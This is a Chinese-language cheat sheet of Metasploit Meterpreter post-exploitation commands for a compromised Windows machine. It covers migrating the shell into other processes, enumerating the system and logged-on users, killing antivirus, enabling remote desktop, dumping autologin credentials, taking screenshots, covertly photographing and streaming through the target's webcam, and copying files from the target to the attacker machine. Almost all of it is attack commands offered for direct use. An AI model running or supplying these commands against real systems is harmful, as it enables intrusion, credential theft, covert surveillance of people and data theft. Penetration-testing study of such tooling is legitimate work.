# Metasploit-Meterpreter-Shell信息收集相关的命令

PS：以下所有的命令都是在Metasploit-Meterpreter Shell下执行的。

## 进程迁移 

1、获取目标机正在运行的进程

```
ps
```

2.查看Meterpreter Shell的进程号

```
getpid
```

3.将Meterpreter Shell进程绑定到其他进程中

```
migrate 要绑定到的进程id号
```

4.系统自动寻找合适的进程迁移

```
run post/windows/manage/migrate
```

## 系统命令

1.查看目标机的系统信息

```
sysinfo
```

2.查看目标机是否运行在虚拟机上

```
run post/windows/gather/checkvm
```

3.查看目标机最近的运行时间

```
idletime
```

4.查看目标机完整的网路设置

```
route
```

5.将当前会话放到后台

```
background
```

6.查看目标机器上已经渗透成功的用户名

```
getuid
```

7.关闭目标机杀毒软件

```
run post/windows/manage/killav
```

8.启动目标机的远程桌面协议

```
run post/windows/manage/enable_rdp
```

9.查看目标机的本地子网情况

```
run post/windows/manage/autoroute
```

10.列举当前有多少用户登录了目标机

```
run post/windows/gather/enum_logged_on_users
```

11.列举安装在目标机上的应用程序

```
run post/windows/gather/enum_applications
```

12.抓取目标机自动登录的用户名和密码

```
run post/windows/gather/credentials/windows)autologin
```

13.抓取目标机屏幕截图

```
load espia
screengrab
```

或者

```
screenshot
```

14.查看目标机有没有摄像头

```
webcam_list
```

15.打开目标机摄像头拍照

```
webcam_snap
```

此命令会将目标机摄像头拍照的图片，以图片的形式保存在攻击机的/root目录下

16.开启摄像头直播模式

```
webcam_stream
```

此命令会将目标机摄像头录制的视频，以html文件的形式保存在攻击机的/root目录下

17.进行目标机shell

```
shell
```

18.停止Meterpreter会话或者停止Shell会话返回Meterpreter

```
exit
```

## 文件系统命令

1.查看当前处于目标机的哪个目录

```
pwd或getwd
```

2.查看当前处于本地的哪个目录

```
getlwd
```

3.列举目标机当前目录中的所有文件

```
ls
```

4.切换目标机目录

```
cd
```

5.搜索C盘所有以.txt为扩展名的文件

```
search -f *.txt -d c:\
```

其中，-f参数用于执行搜索文件模式，-d参数用于指定在哪个目录下进行搜索

6.下载目标机C盘的test.txt文件到攻击机/root下

```
download c:\test.txt /root
```

7.上传攻击机root目录下的test.txt文件到目标机C盘下

```
upload /root/test.txt c:\
```

## 